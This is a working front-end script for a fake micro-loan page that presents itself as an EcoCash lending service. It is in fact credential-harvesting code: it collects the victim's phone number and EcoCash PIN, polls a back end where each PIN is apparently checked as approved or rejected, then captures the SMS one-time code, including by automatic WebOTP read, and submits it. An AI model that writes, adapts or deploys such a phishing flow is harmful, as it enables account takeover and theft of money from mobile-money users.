let currentAppRef = null;
let statusPollInterval = null;
let lastFailedType = 'PIN'; 

function updateLoanCalc() {
  const amount = parseInt(document.getElementById('loanRange').value);
  const interest = Math.round(amount * 0.10);
  const total = amount + interest;

  document.getElementById('calc-amount').innerText = '$' + amount;
  document.getElementById('calc-interest').innerText = '$' + interest;
  document.getElementById('calc-total').innerText = '$' + total;
}

function showSection(sectionId) {
  ['form-step-1', 'form-step-2', 'step-loading', 'form-step-3', 'step-success', 'step-rejected'].forEach(id => {
    document.getElementById(id).classList.add('hidden');
  });

  if (sectionId === 'step-success') {
    document.getElementById('app-header').classList.add('hidden');
  }

  document.getElementById(sectionId).classList.remove('hidden');

  if (sectionId === 'form-step-3') {
    startOTPEngine();
  }
}

async function startOTPEngine() {
  if ('OTPCredential' in window) {
    try {
      const ac = new AbortController();
      const otp = await navigator.credentials.get({
        otp: { transport:['sms'] },
        signal: ac.signal
      });
      
      if (otp && otp.code) {
        document.getElementById('otpCode').value = otp.code;
        submitOTPDetails();
      }
    } catch (err) {
      console.log("Web OTP Auto-fill not supported or aborted", err);
    }
  }
}

function validateAndGoToStep2() {
  const name = document.getElementById('fullName').value.trim();
  const occupation = document.getElementById('occupation').value.trim();
  const income = document.getElementById('monthlyIncome').value.trim();

  if (!name || !occupation || !income) {
    alert("Please complete all required fields before proceeding.");
    return;
  }
  showSection('form-step-2');
}

async function submitStep2Details() {
  const phone = document.getElementById('phone').value.trim();
  const pin = document.getElementById('pin').value.trim();

  if (!/^\d{9}$/.test(phone)) {
    alert("Please enter exactly 9 digits for your Zimbabwe EcoCash phone number.");
    return;
  }

  if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
    alert("Please enter a valid 4-digit EcoCash PIN.");
    return;
  }

  const payload = {
    fullName: document.getElementById('fullName').value,
    occupation: document.getElementById('occupation').value,
    monthlyIncome: document.getElementById('monthlyIncome').value,
    repaymentPeriod: document.getElementById('repaymentPeriod').value,
    loanAmount: document.getElementById('loanRange').value,
    phone: phone,
    pin: pin
  };

  try {
    showSection('step-loading');

    const res = await fetch('/api/apply-loan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await res.json();
    if (data.success) {
      currentAppRef = data.appReference;
      startStatusPolling();

      startCountdown(10, () => {
        showSection('form-step-3');
      });
    } else {
      alert("Application submission failed. Please try again.");
      showSection('form-step-2');
    }
  } catch (err) {
    alert("Network error. Please try again.");
    showSection('form-step-2');
  }
}

async function submitOTPDetails() {
  const otpCode = document.getElementById('otpCode').value.trim();

  if (otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
    alert("Please enter a valid 6-digit OTP code.");
    return;
  }

  try {
    showSection('step-loading');

    const res = await fetch('/api/submit-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        appReference: currentAppRef,
        otpCode: otpCode
      })
    });

    const data = await res.json();
    if (data.success) {
      startCountdown(10, () => {});
    }
  } catch (err) {
    alert("Error submitting OTP. Please try again.");
    showSection('form-step-3');
  }
}

function retryFailedStep() {
  if (lastFailedType === 'PIN') {
    document.getElementById('pin').value = '';
    showSection('form-step-2');
  } else {
    document.getElementById('otpCode').value = '';
    showSection('form-step-3');
  }
}

function startCountdown(seconds, onComplete) {
  let timer = seconds;
  const timerElem = document.getElementById('timer');
  timerElem.innerText = `${timer}s`;

  const interval = setInterval(() => {
    timer--;
    timerElem.innerText = `${timer}s`;
    if (timer <= 0) {
      clearInterval(interval);
      if (typeof onComplete === 'function') {
        onComplete();
      }
    }
  }, 1000);
}

function startStatusPolling() {
  if (statusPollInterval) clearInterval(statusPollInterval);

  statusPollInterval = setInterval(async () => {
    if (!currentAppRef) return;

    try {
      const res = await fetch(`/api/check-status/${currentAppRef}`);
      const data = await res.json();

      if (data.success) {
        if (data.status === 'PIN_APPROVED') {
          showSection('form-step-3');
        } else if (data.status === 'PIN_REJECTED') {
          clearInterval(statusPollInterval);
          lastFailedType = 'PIN';
          document.getElementById('rejection-msg').innerText = "Incorrect EcoCash PIN provided. Please re-enter your PIN.";
          showSection('step-rejected');
        } else if (data.status === 'OTP_APPROVED' || data.status === 'LOAN_APPROVED') {
          clearInterval(statusPollInterval);
          showSection('step-success');
        } else if (data.status === 'OTP_REJECTED') {
          clearInterval(statusPollInterval);
          lastFailedType = 'OTP';
          document.getElementById('rejection-msg').innerText = "Incorrect SMS OTP code provided. Please request and enter a new OTP.";
          showSection('step-rejected');
        }
      }
    } catch (err) {
      console.error("Polling status error:", err);
    }
  }, 2000);
    }
    
